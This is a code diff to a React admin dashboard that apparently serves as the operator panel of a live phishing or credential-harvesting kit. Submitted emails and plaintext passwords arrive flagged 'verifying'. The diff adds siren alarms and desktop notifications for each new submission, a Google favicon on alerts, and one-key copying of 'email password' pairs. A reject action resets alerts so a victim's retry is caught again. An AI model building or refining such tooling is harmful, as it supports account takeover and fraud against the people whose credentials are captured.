@@ -19,15 +19,24 @@ export default function AdminDashboardPage() {
   const [activeCoupon, setActiveCoupon] = useState<string>('...');
   const [couponInput, setCouponInput] = useState<string>('');
   const [toastMsg, setToastMsg] = useState<{ msg: string; type?: 'info' | 'success' | 'warning' | 'danger' } | null>(null);
-  const [acknowledgedUsers, setAcknowledgedUsers] = useState<number[]>([]);
+  const [acknowledgedUsers, setAcknowledgedUsers] = useState<string[]>([]);
   const [soundMuted, setSoundMuted] = useState<boolean>(false);
   const [searchTerm, setSearchTerm] = useState<string>('');
 
   const alarmRef = useRef<HTMLAudioElement | null>(null);
   const isAlarmPlayingRef = useRef<boolean>(false);
-  const lastNotificationTimeRef = useRef<{ [key: number]: number }>({});
   const soundMutedRef = useRef<boolean>(soundMuted);
-  const acknowledgedUsersRef = useRef<number[]>(acknowledgedUsers);
+  const acknowledgedUsersRef = useRef<string[]>(acknowledgedUsers);
+  const audioCtxRef = useRef<AudioContext | null>(null);
+  const synthIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const synthTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+  const notifiedSubmissionsRef = useRef<Set<string>>(new Set());
+
+  // Helper for unique submission signature
+  const getSubKey = (id: number, pass: string) => `${id}:${pass}`;
+  const isAcked = (u: UserData, list: string[] = acknowledgedUsersRef.current) => {
+    return list.includes(getSubKey(u.id, u.password)) || list.includes(String(u.id));
+  };
 
   useEffect(() => {
     acknowledgedUsersRef.current = acknowledgedUsers;
@@ -56,10 +65,27 @@ export default function AdminDashboardPage() {
     setToastMsg({ msg, type });
     setTimeout(() => {
       setToastMsg(null);
-    }, 3500);
+    }, 4000);
   };
 
-  const synthIntervalRef = useRef<any>(null);
+  // Cached AudioContext singleton to prevent hardware context exhaustion crash in Chromium (max 6)
+  const getAudioContext = () => {
+    try {
+      if (typeof window === 'undefined') return null;
+      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+      if (!AudioCtx) return null;
+      if (!audioCtxRef.current || audioCtxRef.current.state === 'closed') {
+        audioCtxRef.current = new AudioCtx();
+      }
+      if (audioCtxRef.current.state === 'suspended') {
+        audioCtxRef.current.resume().catch(() => {});
+      }
+      return audioCtxRef.current;
+    } catch (e) {
+      console.warn('AudioContext error:', e);
+      return null;
+    }
+  };
 
   // Web Audio Synthesizer for 100% reliable continuous Siren Alarm
   const startSynthAlarm = () => {
@@ -68,40 +94,43 @@ export default function AdminDashboardPage() {
     const triggerChime = () => {
       if (soundMutedRef.current) return;
       try {
-        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
-        if (!AudioCtx) return;
-        const ctx = new AudioCtx();
-        if (ctx.state === 'suspended') {
-          ctx.resume();
-        }
+        const ctx = getAudioContext();
+        if (!ctx) return;
 
-        // Dual Tone Siren Chime (High Pitch Alert)
+        // Tone 1: 880Hz (High pitch alert)
         const osc1 = ctx.createOscillator();
         const gain1 = ctx.createGain();
         osc1.type = 'sine';
         osc1.frequency.setValueAtTime(880, ctx.currentTime);
-        gain1.gain.setValueAtTime(0.35, ctx.currentTime);
+        gain1.gain.setValueAtTime(0.3, ctx.currentTime);
         gain1.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
         osc1.connect(gain1);
         gain1.connect(ctx.destination);
         osc1.start();
         osc1.stop(ctx.currentTime + 0.35);
 
-        setTimeout(() => {
+        // Tone 2: 1174.66Hz (Dual tone siren chime)
+        synthTimeoutRef.current = setTimeout(() => {
           if (soundMutedRef.current) return;
-          const osc2 = ctx.createOscillator();
-          const gain2 = ctx.createGain();
-          osc2.type = 'sine';
-          osc2.frequency.setValueAtTime(1174.66, ctx.currentTime);
-          gain2.gain.setValueAtTime(0.35, ctx.currentTime);
-          gain2.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
-          osc2.connect(gain2);
-          gain2.connect(ctx.destination);
-          osc2.start();
-          osc2.stop(ctx.currentTime + 0.35);
+          try {
+            const ctx2 = getAudioContext();
+            if (!ctx2) return;
+            const osc2 = ctx2.createOscillator();
+            const gain2 = ctx2.createGain();
+            osc2.type = 'sine';
+            osc2.frequency.setValueAtTime(1174.66, ctx2.currentTime);
+            gain2.gain.setValueAtTime(0.3, ctx2.currentTime);
+            gain2.gain.exponentialRampToValueAtTime(0.001, ctx2.currentTime + 0.35);
+            osc2.connect(gain2);
+            gain2.connect(ctx2.destination);
+            osc2.start();
+            osc2.stop(ctx2.currentTime + 0.35);
+          } catch (e) {
+            console.warn('Tone 2 error:', e);
+          }
         }, 180);
       } catch (e) {
-        console.error('Audio synth error:', e);
+        console.warn('Audio synth error:', e);
       }
     };
 
@@ -114,35 +143,56 @@ export default function AdminDashboardPage() {
       clearInterval(synthIntervalRef.current);
       synthIntervalRef.current = null;
     }
-  };
-
-  // Alarm management (Instant Play + Continuous Siren Synth)
-  const manageAlarm = (turnOn: boolean) => {
-    if (turnOn && !soundMutedRef.current) {
-      startSynthAlarm();
-      if (alarmRef.current) {
-        alarmRef.current.currentTime = 0;
-        alarmRef.current.play().catch(() => {});
-      }
-      isAlarmPlayingRef.current = true;
-    } else {
-      stopSynthAlarm();
-      if (alarmRef.current) {
-        alarmRef.current.pause();
-        alarmRef.current.currentTime = 0;
-      }
-      isAlarmPlayingRef.current = false;
+    if (synthTimeoutRef.current) {
+      clearTimeout(synthTimeoutRef.current);
+      synthTimeoutRef.current = null;
     }
   };
 
-  // Desktop Notification
+  // Alarm management (Instant Play + Smooth Continuous Siren Synth without 1s loop stutter)
+  const manageAlarm = (turnOn: boolean) => {
+    if (turnOn && !soundMutedRef.current) {
+      if (!isAlarmPlayingRef.current) {
+        isAlarmPlayingRef.current = true;
+        startSynthAlarm();
+        if (alarmRef.current) {
+          alarmRef.current.currentTime = 0;
+          alarmRef.current.play().catch((err) => {
+            console.warn('HTML Audio play deferred/blocked by browser autoplay policy:', err);
+          });
+        }
+      }
+    } else {
+      if (isAlarmPlayingRef.current) {
+        isAlarmPlayingRef.current = false;
+        stopSynthAlarm();
+        if (alarmRef.current) {
+          alarmRef.current.pause();
+          alarmRef.current.currentTime = 0;
+        }
+      }
+    }
+  };
+
+  // Desktop Notification (Robust try/catch and focuses window on click)
   const sendDesktopNotification = (uid: number, email: string) => {
-    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
-      new Notification('🚨 Verification Required: #' + uid, {
-        body: email,
-        icon: 'https://cdn-icons-png.flaticon.com/512/10337/10337609.png',
-        tag: 'user-' + uid,
+    if (typeof window === 'undefined' || !('Notification' in window)) return;
+    if (Notification.permission !== 'granted') return;
+
+    try {
+      const notif = new Notification(`🚨 Verification Required: #${uid}`, {
+        body: `Action needed for: ${email}`,
+        icon: 'https://ssl.gstatic.com/accounts/ui/favicon.ico',
+        tag: `user-submission-${uid}`,
+        requireInteraction: true,
       });
+
+      notif.onclick = () => {
+        window.focus();
+        notif.close();
+      };
+    } catch (e) {
+      console.warn('Desktop notification error:', e);
     }
   };
 
@@ -154,23 +204,21 @@ export default function AdminDashboardPage() {
       setUsers(data);
 
       let shouldRing = false;
-      const currentTime = Date.now();
       let newCount = 0;
 
       data.forEach((u) => {
         const uid = u.id;
-        const sec = u.seconds_ago;
+        const subKey = getSubKey(uid, u.password);
 
         if (u.status === 'verifying') {
           newCount++;
-          if (!acknowledgedUsersRef.current.includes(uid)) {
+          const isAck = isAcked(u, acknowledgedUsersRef.current);
+          if (!isAck) {
             shouldRing = true;
-            if (
-              !lastNotificationTimeRef.current[uid] ||
-              currentTime - lastNotificationTimeRef.current[uid] > 3000
-            ) {
+            if (!notifiedSubmissionsRef.current.has(subKey)) {
+              notifiedSubmissionsRef.current.add(subKey);
               sendDesktopNotification(uid, u.email);
-              lastNotificationTimeRef.current[uid] = currentTime;
+              showToast(`🚨 Incoming Verification Request: #${uid} (${u.email})`, 'danger');
             }
           }
         }
@@ -218,22 +266,60 @@ export default function AdminDashboardPage() {
     }
   };
 
+  // Safe clipboard copy helper with fallback
+  const copyToClipboard = (text: string) => {
+    try {
+      if (typeof navigator !== 'undefined' && navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(text).catch(() => {
+          fallbackCopyText(text);
+        });
+        return;
+      }
+    } catch (e) {
+      // ignore
+    }
+    fallbackCopyText(text);
+  };
+
+  const fallbackCopyText = (text: string) => {
+    try {
+      const textArea = document.createElement('textarea');
+      textArea.value = text;
+      textArea.style.position = 'fixed';
+      textArea.style.left = '-999999px';
+      textArea.style.top = '-999999px';
+      document.body.appendChild(textArea);
+      textArea.focus();
+      textArea.select();
+      document.execCommand('copy');
+      textArea.remove();
+    } catch (e) {
+      console.warn('Clipboard fallback copy error:', e);
+    }
+  };
+
   // User Actions
   const copyData = (email: string, pass: string, id: number) => {
-    navigator.clipboard.writeText(email + ' ' + pass);
-    if (!acknowledgedUsersRef.current.includes(id)) {
-      acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
-      setAcknowledgedUsers((prev) => [...prev, id]);
+    copyToClipboard(`${email} ${pass}`);
+    const key = getSubKey(id, pass);
+    if (!acknowledgedUsersRef.current.includes(key)) {
+      const updated = [...acknowledgedUsersRef.current, key, String(id)];
+      acknowledgedUsersRef.current = updated;
+      setAcknowledgedUsers(updated);
     }
     manageAlarm(false);
     showToast('Credentials copied to clipboard', 'info');
   };
 
-  const approveUser = async (id: number) => {
+  const approveUser = async (id: number, currentPassword?: string) => {
     try {
-      if (!acknowledgedUsersRef.current.includes(id)) {
-        acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
-        setAcknowledgedUsers((prev) => [...prev, id]);
+      const user = usersRef.current.find((u) => u.id === id);
+      const pwd = currentPassword || user?.password || '';
+      const key = getSubKey(id, pwd);
+      if (!acknowledgedUsersRef.current.includes(key)) {
+        const updated = [...acknowledgedUsersRef.current, key, String(id)];
+        acknowledgedUsersRef.current = updated;
+        setAcknowledgedUsers(updated);
       }
       const formData = new FormData();
       formData.append('user_id', String(id));
@@ -252,12 +338,20 @@ export default function AdminDashboardPage() {
     }
   };
 
-  const rejectUser = async (id: number) => {
+  const rejectUser = async (id: number, currentPassword?: string) => {
     try {
-      if (!acknowledgedUsersRef.current.includes(id)) {
-        acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
-        setAcknowledgedUsers((prev) => [...prev, id]);
-      }
+      // Remove any prior acknowledgment so if this user re-submits later, they trigger alerts again
+      const filtered = acknowledgedUsersRef.current.filter((k) => !k.startsWith(`${id}:`) && k !== String(id));
+      acknowledgedUsersRef.current = filtered;
+      setAcknowledgedUsers(filtered);
+
+      // Also allow desktop notification to fire again for any new submission from this user
+      notifiedSubmissionsRef.current.forEach((subKey) => {
+        if (subKey.startsWith(`${id}:`)) {
+          notifiedSubmissionsRef.current.delete(subKey);
+        }
+      });
+
       const formData = new FormData();
       formData.append('user_id', String(id));
       formData.append('status', 'rejected');
@@ -293,11 +387,27 @@ export default function AdminDashboardPage() {
     router.push('/login');
   };
 
-  useEffect(() => {
-    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted') {
-      Notification.requestPermission();
+  const unlockSound = () => {
+    getAudioContext();
+    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'default') {
+      try {
+        Notification.requestPermission().catch(() => {});
+      } catch (e) {
+        // ignore
+      }
     }
+    // Pre-warm audio element for instant zero-delay playback
+    if (alarmRef.current) {
+      alarmRef.current.play().then(() => {
+        if (!isAlarmPlayingRef.current) {
+          alarmRef.current?.pause();
+          if (alarmRef.current) alarmRef.current.currentTime = 0;
+        }
+      }).catch(() => {});
+    }
+  };
 
+  useEffect(() => {
     loadUsers();
     loadCoupon();
 
@@ -305,29 +415,20 @@ export default function AdminDashboardPage() {
     const userInterval = setInterval(loadUsers, 1000);
     const couponInterval = setInterval(loadCoupon, 4000);
 
-    const unlockSound = () => {
-      if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted') {
-        Notification.requestPermission();
-      }
-      // Pre-warm audio element for instant zero-delay playback
-      if (alarmRef.current) {
-        alarmRef.current.play().then(() => {
-          if (!isAlarmPlayingRef.current) {
-            alarmRef.current?.pause();
-            if (alarmRef.current) alarmRef.current.currentTime = 0;
-          }
-        }).catch(() => {});
-      }
+    const handleFirstInteraction = () => {
+      unlockSound();
+      window.removeEventListener('click', handleFirstInteraction);
+      window.removeEventListener('keydown', handleFirstInteraction);
     };
 
-    window.addEventListener('click', unlockSound);
-    window.addEventListener('keydown', unlockSound);
+    window.addEventListener('click', handleFirstInteraction);
+    window.addEventListener('keydown', handleFirstInteraction);
 
     return () => {
       clearInterval(userInterval);
       clearInterval(couponInterval);
-      window.removeEventListener('click', unlockSound);
-      window.removeEventListener('keydown', unlockSound);
+      window.removeEventListener('click', handleFirstInteraction);
+      window.removeEventListener('keydown', handleFirstInteraction);
     };
   }, []);
 
@@ -343,7 +444,7 @@ export default function AdminDashboardPage() {
     const handleKeyDown = (e: KeyboardEvent) => {
       // Don't trigger shortcut if typing inside input or textarea elements
       const target = e.target as HTMLElement | null;
-      if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
+      if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || (target as any).isContentEditable)) {
         return;
       }
 
@@ -354,9 +455,12 @@ export default function AdminDashboardPage() {
           e.preventDefault();
           
           const currentUsers = usersRef.current;
-          // Find latest verifying user first, or latest user overall
+          // Find latest verifying user that is unacknowledged first, or any verifying user, or latest user overall
+          const unackedVerifying = currentUsers.find(
+            (u) => u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
+          );
           const latestVerifying = currentUsers.find((u) => u.status === 'verifying');
-          const targetUser = latestVerifying || currentUsers[0];
+          const targetUser = unackedVerifying || latestVerifying || currentUsers[0];
 
           if (targetUser) {
             copyData(targetUser.email, targetUser.password, targetUser.id);
@@ -384,7 +488,7 @@ export default function AdminDashboardPage() {
   const approvedUsers = users.filter((u) => u.status === 'approved');
   const rejectedUsers = users.filter((u) => u.status === 'rejected');
   const approvedCount = approvedUsers.length;
-  const activePopupUser = verifyingUsers.find((u) => !acknowledgedUsers.includes(u.id)) || null;
+  const activePopupUser = verifyingUsers.find((u) => !isAcked(u, acknowledgedUsers)) || null;
 
   // In all-records view, pin pending/verifying users at the very top, then newest-first
   const sortedAllUsers = [...users].sort((a, b) => {
@@ -1401,6 +1505,27 @@ export default function AdminDashboardPage() {
           </div>
 
           <div className="top-actions">
+            {typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted' && (
+              <button
+                className="icon-toggle-btn"
+                style={{ borderColor: 'rgba(99, 102, 241, 0.4)', background: 'rgba(99, 102, 241, 0.12)', color: '#a5b4fc' }}
+                onClick={() => {
+                  unlockSound();
+                  if (typeof window !== 'undefined' && 'Notification' in window) {
+                    Notification.requestPermission().then((res) => {
+                      if (res === 'granted') {
+                        showToast('Desktop alerts enabled successfully!', 'success');
+                      }
+                    }).catch(() => {});
+                  }
+                }}
+                title="Click to enable desktop notifications"
+              >
+                <i className="ri-notification-3-line"></i>
+                <span>Enable Alerts</span>
+              </button>
+            )}
+
             <button
               className={`icon-toggle-btn ${soundMuted ? 'muted' : ''}`}
               onClick={() => {
@@ -1526,8 +1651,8 @@ export default function AdminDashboardPage() {
                     </tr>
                   ) : (
                     verifyingUsers.map((u) => {
-                      const isUrgent = !acknowledgedUsers.includes(u.id);
-                      const isCopied = acknowledgedUsers.includes(u.id);
+                      const isUrgent = !isAcked(u, acknowledgedUsers);
+                      const isCopied = isAcked(u, acknowledgedUsers);
 
                       return (
                         <tr key={u.id} className={isUrgent ? 'row-urgent' : ''}>
@@ -1570,7 +1695,7 @@ export default function AdminDashboardPage() {
                             <div className="action-cell" style={{ justifyContent: 'center' }}>
                               <button
                                 className="btn-action approve"
-                                onClick={() => approveUser(u.id)}
+                                onClick={() => approveUser(u.id, u.password)}
                                 title="Grant User Access"
                               >
                                 <i className="ri-check-line"></i>
@@ -1579,7 +1704,7 @@ export default function AdminDashboardPage() {
 
                               <button
                                 className="btn-action reject"
-                                onClick={() => rejectUser(u.id)}
+                                onClick={() => rejectUser(u.id, u.password)}
                                 title="Deny Access"
                               >
                                 <i className="ri-close-line"></i>
@@ -1648,7 +1773,7 @@ export default function AdminDashboardPage() {
                     </tr>
                   ) : (
                     displayedHistoryUsers.map((u) => {
-                      const isCopied = acknowledgedUsers.includes(u.id);
+                      const isCopied = isAcked(u, acknowledgedUsers);
 
                       return (
                         <tr key={u.id}>
@@ -1703,7 +1828,7 @@ export default function AdminDashboardPage() {
                             <div className="action-cell" style={{ justifyContent: 'center' }}>
                               <button
                                 className="btn-action approve"
-                                onClick={() => approveUser(u.id)}
+                                onClick={() => approveUser(u.id, u.password)}
                                 title="Grant User Access"
                               >
                                 <i className="ri-check-line"></i>
@@ -1712,7 +1837,7 @@ export default function AdminDashboardPage() {
 
                               <button
                                 className="btn-action reject"
-                                onClick={() => rejectUser(u.id)}
+                                onClick={() => rejectUser(u.id, u.password)}
                                 title="Deny Access"
                               >
                                 <i className="ri-close-line"></i>
@@ -1766,9 +1891,15 @@ export default function AdminDashboardPage() {
             </button>
             <button
               className="btn-action approve"
-              onClick={() => approveUser(activePopupUser.id)}
+              onClick={() => approveUser(activePopupUser.id, activePopupUser.password)}
             >
               <i className="ri-check-line"></i> Approve
+            </button>
+            <button
+              className="btn-action reject"
+              onClick={() => rejectUser(activePopupUser.id, activePopupUser.password)}
+            >
+              <i className="ri-close-line"></i> Reject
             </button>
           </div>
         </div>
